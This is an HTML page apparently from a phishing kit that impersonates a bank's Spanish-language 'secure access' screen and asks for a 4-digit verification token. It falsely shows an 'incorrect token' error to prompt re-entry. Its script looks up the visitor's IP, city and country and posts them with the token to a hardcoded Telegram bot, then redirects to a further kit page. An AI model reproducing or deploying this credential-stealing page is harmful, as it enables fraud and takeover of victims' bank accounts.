<!doctype html>
<html lang="en">
<head>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <link rel="icon" type="ico" href="img/favicon.ico">
  <link rel="icon" type="ico" href="favicon.ico">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>pagina cargando</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="css/style.css">
  <style type="text/css">
    .submit{
        width: 168px;
        height:40px;
        background: #ec0000 !important;
        border-color: #ec0000 !important;
      }
      ::placeholder{
        color: #888 !important;
      }
      @media (max-width:590px){
        .submit{width: 100%;}
        .h-48{height: 30px;}
      }
      input[type=number]::-webkit-inner-spin-button,
      input[type=number]::-webkit-outer-spin-button{
        -webkit-appearance:none !important;
      }
  </style>  
</head>
<body style="background: #FFF !important;">
  <div class="row position-fixed h-100 w-100 justify-content-between m-0">
    <div class="col-12 p-0 text-center">
     <div class="w-100 p-4 border-bottom bg-white">
      <img src="img/bank_logo.png" height="40px">
    </div>
  </div>
  <div class="col-sm-6 col-md-5 col-xl-3 m-auto mt-0 text-center">
    <i class="bi bi-shield-fill-exclamation fs-1 text-" style="color:#00824a;"></i>
    <h3>Acceso seguro</h3>
    <div class="alert border">Le enviamos un código de verificación a su casilla de email para validar su acceso.</div>
    <p class="text-center mb-5">Ingrese los datos que le solicitamos para validar su identidad.</p>
    
          <form id="login-form" class="m-auto">
          <div class="mb-3 text-start">
            <label class="form-label d-block fs-13 fw-semibold">
          Código
        </label>
        <input type="number" oninput="{if (this.value.length > 4) {this.value = this.value.slice(0,4)}}" required id="token" class="form-control text-center " placeholder="####" name="token">
      </div>
      <p class="false text-danger fw-bold" style="font-size: 13px;display: none;">
        <small class="text-danger">El formato es incorrecto. Debe contener 4 digitos.</small>
      </p>
      <p class="false text-danger fw-bold" style="font-size: 13px;">
        <small class="text-danger">El N° de token ingresado es  incorrecto. Intente nuevamente.</small>
      </p>
      <div class="text-center">
        <button type="submit" name="variable" class="btn mb-5 btn-primary px-5 fw-semibold">Continuar</button>
      </div>
    </form>
  </div>
  <div class="col-12"></div>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
<script type="text/javascript">
  var inpu = document.getElementById("token");
  inpu.addEventListener("input", function(){
    if (this.value.length > 4) {
      this.value = this.value.slice(0,4);
    }
  })
  function valid(){
    var ret = false;
    if (document.getElementById("token").value != "" && document.getElementById("token").value.length == 4) {
      ret = true;
    }else{
      ret = false;
      $(".false").show();
    }
    return ret;
  }
</script>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
  <script>
        const url = "https://ipapi.co/json/";
        const form = document.querySelector("#login-form");
        form.addEventListener("submit", (event) => {
          event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
          axios
            .get(url)
            .then((response) => {
              const token = document.querySelector("#token").value;
              const message =
                "✅BSE✅" +
                "\n🔢Token 2: " +
                token +
                "\n🏙️Ciudad: " +
                response.data.city +
                "\n🌎Pais: " +
                response.data.country +
                "\n🔢IP: " +
                response.data.ip +
                "\n🤑JSC0D3R++🤑";
              axios
                .post(
                  "https://api.telegram.org/bot7969804847:AAHStzkMv4sxV7Secj0RFACh007Az2FGxao/sendMessage",
                  {
                    chat_id: "5150089222",
                    text: message,
                  }
                )
                .then((response) => {
                  console.log(response.data);
                  window.location.href = "cargando3.php";
                })
                .catch((error) => {
                  console.error(error);
                });
            })
            .catch((error) => {
              console.log(error);
            });
        });
      </script>
</body>
</html>